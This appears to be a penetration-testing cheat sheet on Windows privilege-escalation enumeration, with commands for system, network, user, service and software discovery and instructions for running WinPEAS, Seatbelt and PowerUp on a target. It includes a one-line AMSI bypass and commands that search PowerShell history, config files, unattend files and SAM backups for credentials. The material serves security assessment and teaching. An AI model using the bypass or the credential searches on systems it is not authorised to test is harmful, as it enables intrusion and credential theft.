title: Windows PrivEsc — Enumeration
html:
Windows PrivEsc — Enumeration

Thorough Windows enumeration is the foundation of privilege escalation. Run all checks before attempting exploits. WinPEAS and Seatbelt automate the majority of this.

System Info

REM Detailed system information (OS version, patches, hotfixes)
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

REM Hostname
hostname

REM Current user and privileges
whoami
whoami /all
whoami /priv
whoami /groups

REM Windows version shortcut
ver

REM Environment variables (check for interesting paths, credentials)
set

REM Installed hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20

Network

REM All interfaces, DNS, DHCP
ipconfig /all

REM All connections with PID
netstat -ano

REM Listening ports only
netstat -ano | findstr LISTENING

REM Routing table
route print

REM ARP cache (other hosts)
arp -a

REM Hosts file
type C:\Windows\System32\drivers\etc\hosts

REM Firewall rules
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all

REM DNS cache
ipconfig /displaydns

Users & Groups

REM All local users
net user

REM Specific user details
net user <username>

REM Local administrators
net localgroup administrators

REM All local groups
net localgroup

REM Domain users (if domain-joined)
net user /domain
net group /domain
net group "Domain Admins" /domain

REM Users via PowerShell
Get-LocalUser
Get-LocalGroupMember Administrators

REM Recently created user accounts
net user | sort

Running Services

REM Running services
sc query
sc query state= all

REM Services with binary paths
wmic service list brief
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

REM Services linked to processes
tasklist /SVC

REM PowerShell service listing
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-WmiObject -Class Win32_Service | Select-Object Name,StartName,PathName | Sort-Object StartName

REM Services running as SYSTEM or Administrator
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -like '*SYSTEM*' -or $_.StartName -like '*admin*'} | Select-Object Name,PathName

Installed Software

REM Installed programs via WMIC
wmic product get name,version

REM Registry-based installs (faster)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr DisplayName
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr DisplayName

REM Programs in common directories
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\opt 2>nul

REM PowerShell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion

Automated Enumeration

WinPEAS

REM Download from: https://github.com/carlospolop/PEASS-ng/releases
REM Transfer to target then:

winpeas.exe
winpeas.exe quiet
winpeas.exe cmd
winpeas.exe log                          REM Save output to file

REM PowerShell version
.\winPEASx64.exe > C:\Temp\winpeas_out.txt 2>&1

REM Bypass AMSI first if needed:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Seatbelt

REM All checks
Seatbelt.exe -group=all

REM System checks only
Seatbelt.exe -group=system

REM User context checks
Seatbelt.exe -group=user

REM Specific checks
Seatbelt.exe TokenPrivileges CredEnum Dpapi

PowerUp

# Run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Find-ModifiableServiceFile
Get-ServiceUnquoted
Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile

PowerShell History

# PowerShell history file (may contain credentials)
Get-Content (Get-PSReadlineOption).HistorySavePath

# Default locations
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# All users' histories (if accessible)
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# cmd history for current session (not persistent)
doskey /history

Interesting Files

REM AlwaysInstallElevated (privesc via MSI)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM Credential-containing files
dir /s /b C:\*.xml C:\*.ini C:\*.txt 2>nul | findstr /i "pass cred secret"
dir /s /b C:\*.config 2>nul | findstr /i "web app"

REM Unattended install files
dir /s /b C:\unattend.xml C:\unattended.xml C:\sysprep.inf C:\sysprep.xml 2>nul

REM SAM and SYSTEM (shadow copies)
dir /s /b C:\Windows\repair\SAM C:\Windows\repair\SYSTEM 2>nul
vssadmin list shadows

REM Recent files
dir %USERPROFILE%\Recent
dir C:\Users\<username>\Desktop
dir C:\Users\<username>\Documents
excerpt: Systematic Windows privilege escalation enumeration — system info, network, users, services, installed software, WinPEAS/Seatbelt/PowerUp, PowerShell history, and interesting files.
